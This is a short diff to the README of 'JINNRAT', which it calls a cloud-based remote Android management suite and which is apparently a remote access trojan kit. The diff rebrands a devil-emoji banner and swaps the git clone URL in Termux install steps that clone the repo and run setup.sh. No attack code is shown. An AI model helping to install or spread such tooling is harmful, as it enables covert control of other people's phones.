@@ -19,7 +19,7 @@ A cloud based remote android managment suite, powered by NodeJS
 
 ```
      ₹____________________<😈>_____________________₹
-                         MR JINN
+                         DARK SHUBH
        [ Telegram : https://t.me/MrJinnTelegram ]
       ₹___________________________________________₹
 ```
@@ -50,7 +50,7 @@ A cloud based remote android managment suite, powered by NodeJS
 ### install setup Termux
 
 ```
-git clone https://github.com/alvinbaby/JINNRAT
+git clone https://github.com/MKmk123github/JINNRAT
 cd JINNRAT
 bash setup.sh
 ```
